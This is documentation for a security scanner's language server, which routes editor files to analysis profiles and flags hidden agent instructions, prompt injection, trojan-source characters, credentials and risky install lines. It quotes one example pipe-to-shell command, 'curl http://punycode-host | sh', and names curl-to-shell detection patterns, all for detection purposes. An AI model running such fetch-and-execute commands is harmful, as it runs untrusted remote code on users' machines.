# LSP analysis profiles (M14)

`tirith lsp` runs a **Language Server** over stdin/stdout so an editor extension
can surface tirith diagnostics inline as you edit. The server reads only the
editor's in-memory document text — it never re-reads the file from disk and
never reaches the network.

When a document is opened or changed, the server:

1. Derives the file path from the document URI and routes it to an **analysis
   profile** by file type (`profile_for_path`). An unrecognised file type gets
   **zero diagnostics** (the server clears any it had previously published).
2. Runs the engine over the buffer once per **scan context** the profile names
   (`contexts_for`), **unions** the findings, and applies the profile's
   **retain** allow-set (`retains`) — keeping only the diagnostics that make
   sense for that file type.
3. Maps each retained finding to one LSP diagnostic (severity, message, the
   rule-id as `code`, source `tirith`, and a range — see below).

`tirith lsp` adds **no new detection rules**. Every diagnostic it emits comes
from a rule that already ships and is reachable today via the named context.

## Profiles

| profile               | which files                                                                 | scan context(s)        | rule families surfaced                                       |
| --------------------- | --------------------------------------------------------------------------- | ---------------------- | ------------------------------------------------------------ |
| **AI-config**         | `CLAUDE.md`, `AGENTS.md`, `.cursorrules`, anything under `.claude/` / `.cursor/`, MCP server configs | `FileScan` **and** `Paste` | See [AI-config rule families](#ai-config-rule-families)       |
| **Markdown install doc** | `README.md`, `INSTALL.md`, `INSTALLATION.md`, `getting-started.md`, and friends (a curated set — **not** every `.md`) | `Paste`                | See [Markdown install doc rule families](#markdown-install-doc-rule-families) |
| **Source code**       | a curated source-extension set (`.rs`, `.py`, `.ts`, `.go`, `.sh`, …)        | `Paste`                | See [Source code rule families](#source-code-rule-families)  |
| **Log file**          | the `.log` extension                                                         | `Paste`                | See [Log file rule families](#log-file-rule-families)        |

### AI-config rule families

- hidden agent instructions
- invisible/non-ASCII config smuggling
- prompt-injection indicators
- the terminal byte-scan deception family
- **and** suspicious install URLs (homograph / punycode / plain-HTTP / `curl | sh`) embedded in the file

### Markdown install doc rule families

- pipe-to-shell install lines
- plain-HTTP / insecure-TLS / shortened URLs
- homograph / punycode / raw-IP / look-alike-TLD hostnames

### Source code rule families

- trojan-source homoglyphs (confusable / bidi / zero-width / Unicode-tags / variation-selector / invisible-whitespace / Hangul-filler)
- hard-coded credentials

### Log file rule families

- terminal byte-scan + prompt-injection over the raw bytes (best-effort — see the limitation below)

### Routing precedence

Routing is by filename first, then extension. AI-config wins over everything, so
a `CLAUDE.md` is **AI-config**, not a Markdown install doc, and a file under
`.cursor/rules/` is AI-config regardless of its extension. After AI-config come
the curated install-doc filenames, then the source extensions, then `.log`. Any
other file routes nowhere and gets no diagnostics — the safe default.

## Why AI-config analyzes in two contexts

A `CLAUDE.md` is two threats at once, and the two live in **different branches**
of the engine:

- The **hidden-instruction / invisible-content** signals (`agent_instruction_hidden`,
  the `config_*` family, the byte-scan deception rules) fire **only** in the
  `FileScan` branch — `Exec` / `Paste` never invoke the file-content scanners.
- A **suspicious install URL** in the file's body (e.g. a
  `curl http://punycode-host | sh` line an agent might fetch) fires the
  URL / transport / hostname rules, which run **only** in the `Exec` / `Paste`
  branch — `FileScan` surfaces nothing for them.

Verified empirically: a plain suspicious URL in a `CLAUDE.md` body produces zero
findings under `FileScan` alone, and a hidden-HTML-comment directive produces
zero findings under `Paste` alone. So the AI-config profile is the one profile
that analyzes in **both** contexts and unions the result. `Paste` (not `Exec`)
is used for the URL half because a config file is pasted-like prose, not a typed
command: `Paste` runs the URL + command-shape rules cleanly without `Exec`'s
command-card prelude stripping and taint / blast-radius hot-path guards, and its
tier-1 regex is a superset of `Exec`'s so nothing is gated out. The retain
allow-set then drops the incidental `Paste`-only noise (a bare prose-line
`pipe_to_interpreter`, `hidden_multiline`) and keeps the genuine AI-config
signals plus the suspicious-URL families.

## Diagnostic ranges: precise vs whole-document

LSP diagnostics carry a range (a start/end line:column). tirith findings do not
all carry a position — most are whole-document facts (a URL was extracted, a
command shape matched). So in v1:

- A finding whose **evidence carries a byte offset** into the buffer gets a
  **precise range** at that position. Two evidence kinds carry byte offsets:
  `ByteSequence` (the bidi / zero-width / invisible-unicode byte-scan rules) and
  the first suspicious char of `HomoglyphAnalysis` (confusable detection). The
  byte offset is converted to an LSP `Position` whose `character` is a **UTF-16
  code-unit** column (per the LSP spec — not a byte index and not a scalar-value
  index), and a one-unit span is highlighted so the squiggle is visible.
- **Every other finding is whole-document**: its range spans from the start of
  the buffer to its end. This is correct (the finding really is about the whole
  document) but coarse; a future revision can thread richer spans through the
  engine to tighten these.

Severities map as: Critical / High → `Error`, Medium → `Warning`, Low →
`Information`, Info → `Hint`. The `code` field is the rule-id string (e.g.
`punycode_domain`) so an editor can group or filter by rule, and `source` is
`tirith`.

## Limitations (v1)

| limitation                          | detail                                                                                                                                                                                                 |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Log-file diagnostics are partial** | See [Log-file diagnostics are partial](#log-file-diagnostics-are-partial) below.                                                                                                                                                                                                       |
| **AI-config drift is out of scope**  | The drift rules `ai_config_hidden_instruction_added` / `ai_config_tool_use_escalation` compare a file against a last-known-safe **snapshot** (`tirith ai diff`). They cannot fire on a single in-editor buffer with no snapshot to diff against, so the LSP never produces them (they remain in the AI-config retain set only so a future snapshot-aware client keeps them if present). |
| **Whole-document ranges**            | As above — findings without byte-offset evidence are reported against the whole document rather than a precise span.                                                                                    |
| **No quick-fixes / code actions**    | v1 publishes diagnostics only. It does not offer code actions, hovers, or completions.                                                                                                                  |

### Log-file diagnostics are partial

The M7 `output_*` rules (OSC-52 clipboard writes, fake prompts, hidden text in
terminal output, hyperlink mismatch, title manipulation, …) fire **only**
through `engine::analyze_output`, never through the `engine::analyze` path the
LSP per-document loop uses. So a `.log` file surfaces only the terminal
byte-scan + prompt-injection subset that `analyze` produces in `Paste`. A
LogFile-aware client that wants the true `output_*` diagnostics must route the
buffer through `analyze_output` and apply the same retain allow-set; the LSP
server does not do this in v1 because forcing a second, divergent analysis path
for one file type was judged more fragile than documenting the gap.

## Running it

`tirith lsp` speaks the LSP wire protocol on stdio; run it from an editor's LSP
client, not interactively. The server advertises full-text document sync and the
`didOpen` / `didChange` / `didClose` notifications, so each change re-analyzes
the complete new buffer.
